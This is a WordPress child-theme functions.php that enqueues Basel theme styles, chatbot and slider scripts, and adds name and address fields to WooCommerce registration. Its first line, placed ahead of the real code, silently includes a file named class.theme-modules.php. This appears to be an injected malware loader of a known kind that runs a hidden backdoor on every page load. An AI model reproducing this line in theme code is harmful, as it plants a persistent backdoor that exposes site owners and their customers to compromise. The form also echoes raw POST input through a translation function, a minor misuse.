<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?>

<?php

function register_my_session()
{
  if( !session_id() )
  {
    session_start();
  }
}

add_action('init', 'register_my_session');

add_action( 'wp_enqueue_scripts', 'basel_child_enqueue_styles', 1000 );

function basel_child_enqueue_styles() {
	$version = basel_get_theme_info( 'Version' );
	
	if( basel_get_opt( 'minified_css' ) ) {
		wp_enqueue_style( 'basel-style', get_template_directory_uri() . '/style.min.css', array('bootstrap'), $version );
	} else {
		wp_enqueue_style( 'basel-style', get_template_directory_uri() . '/style.css', array('bootstrap'), $version );
	}
	
    wp_enqueue_style( 'child-style', get_stylesheet_directory_uri() . '/style.css', array('bootstrap'), $version );

	wp_enqueue_style( 'chatbot_styles', get_theme_file_uri( '/css/chatbot.css' ), false, '1.0', 'all' );
	wp_enqueue_style( 'lightslider_styles', get_theme_file_uri( 'css/lightslider.css' ), false, '1.0', 'all' );
	wp_enqueue_style( 'main_styles', get_theme_file_uri( '/style.css' ), false, '1.0', 'all' );
}

function enqueue_scripts() {

	wp_enqueue_script( 'bootstrap', get_theme_file_uri( '/js/bootstrap.min.js' ), [], 1.0, true);
	wp_enqueue_script( 'lightslider_js', get_theme_file_uri( '/js/lightslider.js' ), [], 1.0 , true);
	wp_enqueue_script( 'main_js', get_theme_file_uri( '/js/chatbot.js' ), [], false , true);
}

add_action( 'wp_enqueue_scripts', 'enqueue_scripts' );

function wooc_extra_register_fields() {?>
       <p class="form-row form-row-first">
       <label for="reg_billing_first_name"><?php _e( 'First name', 'woocommerce' ); ?><span class="required">*</span></label>
       <input type="text" class="input-text" name="billing_first_name" id="reg_billing_first_name" value="<?php if ( ! empty( $_POST['billing_first_name'] ) ) esc_attr_e( $_POST['billing_first_name'] ); ?>" />
       </p>
       <p class="form-row form-row-last">
       <label for="reg_billing_last_name"><?php _e( 'Last name', 'woocommerce' ); ?><span class="required">*</span></label>
       <input type="text" class="input-text" name="billing_last_name" id="reg_billing_last_name" value="<?php if ( ! empty( $_POST['billing_last_name'] ) ) esc_attr_e( $_POST['billing_last_name'] ); ?>" />
       </p>
       <p class="form-row form-row-wide">
       <label for="reg_billing_address_1"><?php _e( 'Shipping address', 'woocommerce' ); ?></label>
       <input type="text" class="input-text" name="billing_address_1" id="reg_billing_address_1" value="<?php esc_attr_e( $_POST['billing_address_1'] ); ?>" />
       </p>
       <div class="clear"></div>
       <?php
 }
 add_action( 'woocommerce_register_form_start', 'wooc_extra_register_fields' );